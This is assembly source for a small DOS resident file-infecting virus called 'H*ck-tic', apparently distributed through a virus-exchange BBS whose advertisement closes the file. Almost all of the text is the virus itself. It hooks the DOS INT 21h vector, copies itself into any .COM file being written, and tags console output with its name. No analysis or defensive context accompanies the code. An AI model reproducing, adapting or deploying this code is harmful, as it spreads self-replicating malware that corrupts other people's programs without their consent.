tic             segment
                org     100h
                assume  cs:tic, ds:tic, es:tic
;
len     equ     offset int21-100h      ;LENGTH OF VIRUS CODE
;
start:          mov     ax,9000h       ;MOVE VIRUS CODE UP
                mov     es,ax
                mov     di,si
                mov     cx,len
                rep     movsb
                mov     ds,cx           ;DS = 0
                mov     si,84h          ;INT 21 VECTOR
                mov     di,offset int21
                push    di
                mov     dx,offset infect
                lodsw                   ;SAVE ORIGINAL VECTOR
                cmp     ax,dx           ;VIRUS PROBABLY ALREADY RESIDENT
                je      exit
                stosw
                lodsw
                stosw
                push    es
                pop     ds
                mov     ax,2521h        ;REVECTOR TO VIRUS
                int     21h
exit:           push    cs              ;RESTORE SEGMENT REGISTERS
                pop     ds
                push    cs
                pop     es
                pop     si              ;SI = END OF VIRUS CODE
                mov     di,0fch
                push    di              ;RETURN HERE
                mov     ax,0aaach       ;LODSB/STOSB INSTRUCTIONS
                stosw
                mov     ax,0fce2h       ;LOOP TO ADDRESS INSTRUCTIONS
                stosw
                mov     ch,0feh
                ret                     ;MOVE CODE AND RUN PROGRAM
;
infect:         pushf
                push    ax
                push    cx
                push    dx
                push    si
                push    ds
                cmp     ah,40h          ;WRITE FUNC?
                jne     done
                cmp     bx,1
                je      mes
                mov     si,dx           ;DS:DX = WRITE BUFFER
                lodsb
                cmp     al,0b8h         ;ALREADY INFECTED?
                je      done
                cmp     al,0ebh         ;PROBABLY .COM
                jne     done
                mov     cx,len          ;LENGTH OF VIRUS
                mov     dh,1            ;DX ASSUMED TO BE 0
hack:           push    cs
                pop     ds
                pushf
                call    cs:[int21]      ;WRITE VIRUS
done:           pop     ds
                pop     si
                pop     dx
                pop     cx
                pop     ax
                popf                    ;CONTINUE INTERRUPT
                jmp     cs:[int21]
mes:            mov     cx,12
                mov     dx,offset string
                jmp     short hack
string  db      ' (H*ck-tic) '
;
int21   dd      0c3h                    ;STANDALONE VIRUS RETURNS
tic             ends
                end     start

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; 컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
; 컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

